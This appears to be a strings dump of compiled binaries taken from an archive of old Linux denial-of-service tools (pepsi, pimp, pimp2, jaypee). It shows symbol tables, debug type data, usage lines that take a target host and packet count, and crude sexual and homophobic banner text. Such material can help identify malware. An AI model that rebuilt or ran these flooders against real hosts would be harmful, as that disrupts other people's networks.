            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "pepsi.c",
            "srcport",
            "dstport",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "resolve",
            "puts@@GLIBC_2.0",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "parse_args",
            "wait",
            "psize",
            "_start",
            "getopt@@GLIBC_2.0",
            "strlen@@GLIBC_2.0",
            "banner",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "srchost",
            "resolvedest",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "optarg@@GLIBC_2.0",
            "numpacks",
            "_IO_stdin_used",
            "dstaddr",
            "__data_start",
            "socket@@GLIBC_2.0",
            "rand@@GLIBC_2.0",
            "optind@@GLIBC_2.0",
            "target",
            "__gmon_start__",
            "strcpy@@GLIBC_2.0",
            "datapool/bin/pimp",
            "0100755",
            "0000000",
            "0000000",
            "00000033347",
            "07100656657",
            "013051",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "stdout",
            "memcpy",
            "setvbuf",
            "malloc",
            "socket",
            "__deregister_frame_info",
            "sendto",
            "inet_aton",
            "memset",
            "herror",
            "shutdown",
            "gethostbyname",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRhT",
            "QVh@",
            "U4Sj",
            "E}u\"h\u058b",
            "jAEP",
            "E\u070bE ",
            "EU\u0709P",
            "U\u0609Pj",
            "EPEP",
            "U\tfJ",
            "U\u0609Pj",
            "EPEP h",
            "U\tfJ",
            "U\u0609Pj",
            "EPEPt Ef@",
            "U\u0609Pj",
            "EPEP0 Eh@",
            "u$hc",
            "\u0403;u[]",
            "pimp.c by nyt",
            "usage: pimp <host> <number>",
            "ERROR: %s",
            "could not create raw socket",
            "could not allocate memory",
            "128.1.1.1",
            "pimpin' dem trick-ass-bitches",
            "*slap* *slap* bitch, who yo daddy",
            "gethostbyname()",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "pimp.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "resolve",
            "setvbuf@@GLIBC_2.0",
            "shutdown@@GLIBC_2.0",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stdout@@GLIBC_2.0",
            "inet_aton@@GLIBC_2.0",
            "_start",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "herror@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/pimp2",
            "0100755",
            "0000000",
            "0000000",
            "00000032743",
            "07100656656",
            "013131",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "stdout",
            "memcpy",
            "setvbuf",
            "malloc",
            "socket",
            "__deregister_frame_info",
            "sendto",
            "inet_aton",
            "memset",
            "herror",
            "shutdown",
            "gethostbyname",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRh",
            "U4SE",
            "t(h ",
            "jAEP",
            "E\u060bE ",
            "EU\u0609P",
            "U\u0509Pj",
            "EPEP- h",
            "U\tfJ",
            "U\u0509Pj",
            "EPEP h",
            "U\tfJ",
            "U\u0509Pj",
            "EPEP Ef@",
            "U\u0509Pj",
            "EPEPG Ej",
            "]\u0209]U",
            "\u0403;u[]",
            "pimp2.c by icesk.",
            "<dest_addr> <num> <src_addr> <igmp code; pimp: 31> <interval>",
            "128.1.1.1",
            "gethostbyname()",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "pimp2.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "_fp_hw",
            "resolve",
            "setvbuf@@GLIBC_2.0",
            "shutdown@@GLIBC_2.0",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stdout@@GLIBC_2.0",
            "inet_aton@@GLIBC_2.0",
            "_start",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "herror@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/jaypee",
            "0100755",
            "0000000",
            "0000000",
            "00000032717",
            "07100656615",
            "013353",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "connect",
            "perror",
            "socket",
            "bzero",
            "send",
            "inet_addr",
            "__deregister_frame_info",
            "bcopy",
            "gethostbyname",
            "htons",
            "exit",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh4",
            "QVh\u0207",
            "E1fE",
            "t$EP",
            "\u0403;u[]",
            "gethostbyname()",
            "connect()",
            "JaY peE is SendinG MaSsivE AnAl Rape  to",
            "[%s:%d].",
            "Usage: ./jaypee [ anus to penetrate]",
            "Antionline is a (c) of Hegirls.com the best fetish on the net",
            "Did i mention i was a model under the name pee jay? lick my balls",
            "Hey lovers catch me on Undernet #analfetish",
            "            -email jp@antionline.com",
            "socket()",
            "Analing jay pee target crash... ",
            "oh yes i feel gay susesfuly raped by -jp!",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
